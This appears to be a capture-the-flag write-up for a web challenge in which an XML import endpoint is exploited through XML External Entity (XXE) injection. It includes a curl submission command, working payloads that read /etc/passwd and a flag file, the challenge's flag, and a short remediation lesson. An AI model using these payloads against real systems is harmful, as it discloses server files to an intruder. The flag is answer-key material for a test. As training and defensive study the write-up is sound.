# Export XML

**Challenge title:** Export XML\
**Category:** Web\
**Difficulty:** Hard\
**Points:** 175\
**Author:** Perceval

## Target

- https://export-xml.cyberzerk.fr

## Solution

### Step 1: Identify the XML import endpoint

The challenge accepts leave-request XML through an HTTP POST request. There is no browser upload field, so send the XML directly in the request body with the `Content-Type: application/xml` header.

On Windows, create a file named `payload.xml` and submit it using PowerShell:

```powershell
curl.exe -i -X POST "https://export-xml.cyberzerk.fr/" -H "Content-Type: application/xml" --data-binary "@payload.xml"
```

### Step 2: Confirm external entity expansion

Use an external entity that reads the server's `/etc/passwd` file:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <agent>&xxe;</agent>
  <motif>PASSWD_TEST</motif>
</root>
```

The response displayed the contents of `/etc/passwd` in the Agent field, confirming that the XML parser resolved external entities and disclosed local files.

### Step 3: Read the flag

Change the entity's system identifier to `file:///flag.txt`:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>
  <agent>&xxe;</agent>
  <motif>FLAG_TEST</motif>
</root>
```

The response returned the flag in the Agent field.

## Flag

```text
CyberZerk{XXE_f1l3_pr0t0c0l_l1t_l3_fich13r_d3s_c0ng3s}
```

## Security Lesson

The XML parser was configured to resolve external entities supplied by the requester. This enabled an XML External Entity (XXE) attack and arbitrary local file disclosure. Disable external entity and external DTD processing, use a securely configured XML parser, and validate the expected XML structure.
